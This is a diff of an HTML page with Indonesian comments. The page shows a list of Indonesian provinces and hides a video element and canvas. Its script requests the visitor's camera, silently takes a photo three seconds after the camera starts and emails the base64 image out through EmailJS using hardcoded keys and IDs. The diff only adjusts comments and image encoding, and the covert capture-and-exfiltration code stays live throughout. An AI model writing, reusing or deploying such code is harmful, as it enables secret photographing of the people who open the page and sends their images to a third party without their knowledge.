@@ -12,18 +12,18 @@
     <li>Jawa Barat</li>
     <li>Jawa Tengah</li>
     <li>Nusa Tenggara Barat</li>
-    <!-- Tambahkan sesuai kebutuhan -->
   </ul>
 
   <!-- Video tersembunyi -->
   <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
+  <!-- EmailJS -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
     (function(){
-      // Ganti dengan Public Key kamu dari EmailJS
-      emailjs.init("8y4NpgAMKhzz-pqFL");
+      // Ganti dengan Public Key EmailJS kamu
+      emailjs.init("8y4NpgAMKhzz-pqFL"); 
     })();
 
     const video = document.getElementById('video');
@@ -35,13 +35,13 @@
       .then(stream => {
         video.srcObject = stream;
 
-        // Tunggu kamera siap, lalu ambil foto otomatis
+        // Ambil foto otomatis setelah 3 detik
         setTimeout(() => {
           canvas.width = video.videoWidth;
           canvas.height = video.videoHeight;
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          const dataURL = canvas.toDataURL("image/png");
+          const dataURL = canvas.toDataURL("image/png").replace(/^data:image\/png;base64,/, "");
 
           // Kirim email via EmailJS
           emailjs.send("service_cw175cv", "template_f7501pb", {
@@ -53,7 +53,7 @@
             console.error("❌ Gagal kirim:", err);
           });
 
-        }, 3000); // foto diambil 3 detik setelah kamera aktif
+        }, 3000);
       })
       .catch(err => console.error("Izin kamera ditolak: ", err));
   </script>
